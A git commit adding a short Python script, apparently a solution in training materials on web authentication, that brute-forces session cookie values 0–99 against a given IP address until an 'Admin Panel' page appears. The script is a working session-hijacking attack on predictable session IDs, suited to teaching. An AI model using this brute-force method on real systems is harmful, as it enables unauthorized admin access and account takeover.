b2371349c97deebd72f0afc5f02159cba65057c7
antonimalinowski <antonimalinowski.kontakt@gmail.com>
2023-04-20 22:06:20 +0200

    Add python script for finding session id (cookie) belonging to admin based on input ip_address - brute force method

---
+++ materials_and_solutions/web_modules/user_authentication/get_admin_sessid.py
@@ -0,0 +1,13 @@
+﻿import requests
+import sys
+
+if (len(sys.argv) != 2):
+    raise Exception('Syntax: python3 program.py ip_address')
+
+ip_address = sys.argv[1]
+
+for i in range(100):
+    r = requests.get(f'http://{ip_address}/',
+                     cookies={'CyberSkillerSESSID': str(i)})
+    if 'Admin Panel' in r.text:
+        print(i)
